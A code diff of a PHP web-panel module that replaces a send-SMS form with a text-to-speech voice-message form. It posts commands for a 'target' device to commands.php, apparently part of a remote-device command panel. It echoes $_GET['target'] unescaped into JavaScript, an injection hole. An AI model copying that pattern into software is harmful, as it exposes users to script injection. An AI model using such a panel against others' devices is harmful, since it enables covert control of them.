@@ -1,27 +1,36 @@
 <?php 
 require_once 'module_controller.php';
 ?>
+
     <div class="row">
         <div class="col-md-11 col-lg-offset-0">
             <div class="well">
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Mesaj Gönder</legend>
+                <legend>Yazı Seslendirme</legend>
                 <div class="row">
                     <form class="form-horizontal col-md-8 col-lg-offset-1">
                         <fieldset>
-                            <div class="form-group">
-                                <label for="phone-number-id" class="col-lg-2 control-label">Tel. No.</label>
-                                <div class="col-lg-5">
-                                    <input class="form-control" id="phone-number-id" placeholder="+905000000000" type="text">
+                            <div class="col-md-10 col-lg-offset-4">
+                                <label for="select" class="col-lg-4 control-label">Ses Dili</label>
+
+                                <div class="col-lg-4">
+                                    <select class="form-control" id="selected-land-id" name="selected-file">
+
+                                        <option>TR</option>
+                                        <option>EN</option>
+                                        <option>RU</option>
+                                    </select>
                                 </div>
                             </div>
+
+
 
                             <div class="form-group">
                                 <label for="sms-content-id" class="col-lg-2 control-label">Mesaj</label>
                                 <div class="col-lg-10">
-                                    <textarea class="form-control" rows="4" id="sms-content-id" placeholder="Sms içeriğini yazınız..."></textarea>
+                                    <textarea class="form-control" rows="6" id="sms-content-id" placeholder="Mesaj içeriğini yazınız..."></textarea>
                                 </div>
                             </div>
 
@@ -41,31 +50,30 @@ require_once 'module_controller.php';
     <script>
 
         $("#send-btn-id").click(function() {
-            var phoneNumber = $("#phone-number-id").val().trim()+'';
-            var smsContent = $("#sms-content-id").val().trim()+'';
+            var languageType =  $("#selected-land-id option:selected").text().trim();
+            var messageContent = $("#sms-content-id").val().trim()+'';
 
-            if (phoneNumber != '' && smsContent!=''){
+            if (languageType != '' && messageContent!=''){
 
                 var commands = {
                     send_command: true,
                     target:"<?php echo $_GET['target'];?>",
-                    type: 'send_sms',
+                    type: 'voice_message',
                     value: {
-                            "phone_number": phoneNumber, "sms_content": smsContent
+                            "message_type": languageType, "message_content": messageContent
                         }
                 };
 
                 $.post( "commands.php", commands, function( data, err ) {
-                    console.log(data);
                     if (data.status){
                         Toastify({
-                            text: "Komut gönderildi.!",
+                            text: "Command Sent!",
                             backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                             className: "info",
                         }).showToast();
                     } else {
                         Toastify({
-                            text: "Komut başarısız.!",
+                            text: "Command Failed.!",
                             backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                             className: "info",
                         }).showToast();
